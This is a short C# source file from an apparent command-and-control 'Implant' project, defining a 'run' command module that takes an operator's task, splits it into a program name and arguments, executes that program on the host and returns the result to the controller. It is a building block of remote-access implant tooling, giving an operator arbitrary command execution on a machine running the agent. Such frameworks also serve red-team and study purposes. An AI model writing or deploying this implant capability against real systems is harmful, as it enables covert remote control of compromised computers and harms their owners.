using Implant.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Implant.Commands
{
    public class Run : Command
    {
        public override string Name => "run";

        public override AgentTaskResult Execute(string taskId, string agentId, string arguments)
        {

            int spaceIndex = arguments.IndexOf(' ');

            string fileName = arguments.Substring(0, spaceIndex);
            string argumentsCommand = arguments.Substring(spaceIndex + 1);

            return new AgentTaskResult{
                TaskId = taskId,
                AgentId = agentId,
                Result = Internal.Execute.ExecuteCommand(fileName, argumentsCommand)
            };
        }
    }
}
